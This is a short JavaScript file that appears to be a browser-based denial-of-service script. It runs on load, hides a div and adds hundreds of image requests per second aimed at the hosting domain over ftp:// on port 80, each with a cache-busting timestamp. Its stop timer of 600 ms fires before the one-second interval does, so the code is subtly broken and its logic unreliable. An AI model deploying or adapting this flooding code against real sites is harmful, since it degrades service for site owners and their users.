function denialOfService(){
  var domain = window.location.hostname;
  var elem = document.createElement('div');
  
  elem.id = 'denial'; 
  elem.style.display = 'none';
  document.body.appendChild(elem);
  
  window.denialOfService = setInterval(function(){
    for(var i = 0; i < 768; ++i ) {
      var img = document.createElement('img');
      img.setAttribute('src', 'ftp://' + domain + ':80/image' + new Date().getTime() + i );
      elem.appendChild(img);
    }
  }, 1000);

}

function stopDenialOfService(){
  clearInterval(window.denialOfService);
}

denialOfService();
setTimeout(stopDenialOfService, 60 * 10);

